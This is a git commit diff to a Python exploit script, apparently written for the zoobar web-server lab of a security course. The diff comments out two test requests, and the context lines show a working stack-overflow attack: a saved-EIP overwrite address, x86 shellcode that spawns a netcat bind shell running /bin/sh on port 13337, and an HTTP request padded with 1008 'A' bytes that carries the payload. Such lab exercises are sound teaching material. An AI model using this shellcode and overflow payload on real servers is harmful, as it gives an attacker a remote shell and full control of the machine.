29336d12d21b478ef0f9107abf58380c975bd451
Antti Ollila <antti.ollila@balduri.fi>
2016-06-08 02:20:13 +0300

    -

--- zoobar_eip_overwrite.py
+++ zoobar_eip_overwrite.py
@@ -17,9 +17,9 @@ eip_override = "\xa5\x94\x04\x08"
 shellcode = "\x31\xc0\x50\x68\x33\x33\x33\x37\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65" \
             "\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x50\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"
 s = None
-command2 = "GET / HTTP/1.1\r\nHost: "+ HOSTNAME + "\r\nConnection: Close\r\n\r\n"
+#command2 = "GET / HTTP/1.1\r\nHost: "+ HOSTNAME + "\r\nConnection: Close\r\n\r\n"
 command = "GET /" +  1008 * "A" + payload + " HTTP/1.1\r\nHost: "+ HOSTNAME + "\r\nConnection: Close\r\n\r\n"
-req =   "GET / HTTP/1.0" + "A" * 2000 + "\r\n\r\n"
+#req =   "GET / HTTP/1.0" + "A" * 2000 + "\r\n\r\n"
 printdata = ""
 
 for res in socket.getaddrinfo(HOSTNAME, PORT, socket.AF_INET, 
